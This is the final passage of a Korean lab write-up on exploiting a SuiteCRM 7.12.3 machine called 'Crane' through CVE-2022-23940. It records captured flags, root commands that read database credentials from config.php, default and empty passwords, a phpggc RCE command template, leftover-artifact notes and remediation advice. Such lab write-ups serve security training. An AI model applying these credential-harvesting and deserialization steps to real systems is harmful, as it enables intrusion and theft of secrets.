| `local.txt` | `/var/www/local.txt` (비표준) | `dd091466af4faca653da308c6d836aa1` |
| `proof.txt` | `/root/proof.txt` | `f92c362a87099978dbf8f3f108147934` |

⚠️ 두 플래그 모두 값만 남았고 `whoami; id; hostname; hostname -I; date; cat <플래그>` 한 화면 증거(`proof_user.txt`·`proof_root.txt`)는 **수집되지 않았음.** 프롬프트 `www-data@crane:` · `root@crane:#` 이 대화형 셸이었다는 유일한 증거임.

**root 로 추가 수집**

```bash
root@crane:/# grep suitecrm_version /var/www/html/suitecrm_version.php
$suitecrm_version = '7.12.3';

root@crane:/# grep -A8 dbconfig /var/www/html/config.php
  'dbconfig' =>
  array (
    'db_host_name' => 'localhost',
    'db_host_instance' => 'SQLEXPRESS',
    'db_user_name' => 'root',
    'db_password' => '',
    'db_name' => 'suitecrm',
    'db_type' => 'mysql',
```

앞의 것이 버전 판정의 두 번째 독립 근거임. 뒤의 DB 자격증명은 `root` / 빈 패스워드지만 이미 시스템 root 라 추가 활용 불요 — foothold 를 못 잡았을 때의 대체 경로로만 값이 있음.

**이 자격증명은 외부에서 못 씀.** nmap 의 `3306/tcp MySQL (unauthorized)` 가 그 결과임. 직접 원인은 내 접속 호스트가 `mysql.user` 의 어떤 `user@host` 행과도 매칭되지 않았다는 것임.
`root@localhost` 만 존재했을 가능성이 높으나 `[가정]` — `SELECT user,host FROM mysql.user` 를 조회하지 않음. `config.php` 의 `db_host_name => 'localhost'` 는 **앱이 접속하는 주소**일 뿐 서버측 호스트 ACL 이 아님. 둘을 같은 것으로 읽으면 안 됨.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| `AOR_Scheduled_Reports` 에 생성된 악성 예약 보고서 레코드(`name=test`) | 남아 있음 — 랩 Stop 으로 소멸 |
| SuiteCRM `admin` 세션 `PHPSESSID=sjo380h10tbfpm7ih1lav9vdms` | 만료 |
| 업로드 파일 없음 — 웹셸 미사용, 인메모리 RCE | — |
| Kali 쪽 tmux 세션 `crane`(리스너) | 종료 |

획득 자격증명: SuiteCRM `admin` / `admin`, MySQL `root` / (빈 문자열). 원격에서 붙는지는 미확인 `[가정]`.

조치(위 두 자격증명 저장 상태에 대한 것):
- MySQL `root` 빈 패스워드 → 애플리케이션 전용 계정을 별도 생성해 필요한 DB 에만 최소 권한 부여. root 비밀번호 설정 및 `FILE` 권한 회수
- `config.php` 의 DB 자격증명 평문 저장 → 파일 권한을 웹서버 사용자 읽기 전용으로 제한하고 환경변수·시크릿 관리자로 이전

## 관련

- CVE-2022-23940 — SuiteCRM `AOR_Scheduled_Reports` 인증 후 PHP 객체 역직렬화 RCE (7.12.5 · SuiteCRM-Core 8.0.4 에서 패치)
  - NVD: <https://nvd.nist.gov/vuln/detail/CVE-2022-23940>
- 사용한 PoC: <https://github.com/manuelz120/CVE-2022-23940>
- phpggc — PHP 가젯 체인 생성기: <https://github.com/ambionics/phpggc> (`phpggc Monolog/RCE2 system '<cmd>' -b`)
- GTFOBins `service`: <https://gtfobins.github.io/gtfobins/service/>
- PHP 매직 메서드: <https://www.php.net/manual/en/language.oop5.magic.php> · `unserialize()` `allowed_classes`: <https://www.php.net/manual/en/function.unserialize.php>
- OWASP Deserialization Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html>
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-38. `python3` 가 없어 TTY 업그레이드가 안 된다]]
- [[_PLAYBOOK#B-1-29. 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로]] · [[_PLAYBOOK#B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]
- [[_PLAYBOOK#B-1-44. PHP 객체 역직렬화(PHP Object Injection) + phpggc]] · [[_PLAYBOOK#B-3-14. sudo `service` — 인자가 «경로에 이어붙는» 프로그램은 전부 탈출구다]] · [[_PLAYBOOK#B-89. 리스너는 `tmux` + `rlwrap` 으로 띄운다]]
- [[_PLAYBOOK#A-2-31. 인스톨러 잔존물은 대개 함정이다 — 5분 상한]] · [[_PLAYBOOK#A-2-32. 역직렬화 가젯 체인이 «에러 없이» 죽는다]] · [[_PLAYBOOK#A-4-16. GTFOBins 로 띄운 root 셸이 즉시 죽는다]] · [[_PLAYBOOK#A-1-17. nmap 이 `filtered` 라고 적은 포트를 버렸다]]
- [[01. Pentest Foundations]] — Crane 항목
- [[Hawat]] — 인용 중첩 회피(hex 리터럴) · 아웃바운드 포트 제약 · "응답이 성공을 뜻하지 않는다"
- [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Squid]] — "응답이 성공을 뜻하지 않는다" 패턴 누적
- [[Hub]] · [[Levram]] — "버전 판정은 독립 근거 2개" 패턴 누적
- [[Cockpit]] — `sudo -l` 한 줄로 끝나는 GTFOBins 권한상승(`tar … *` 와일드카드)
- [[Levram]] · [[Astronaut]] · [[Twiggy]] — 같은 Foundations 컬렉션
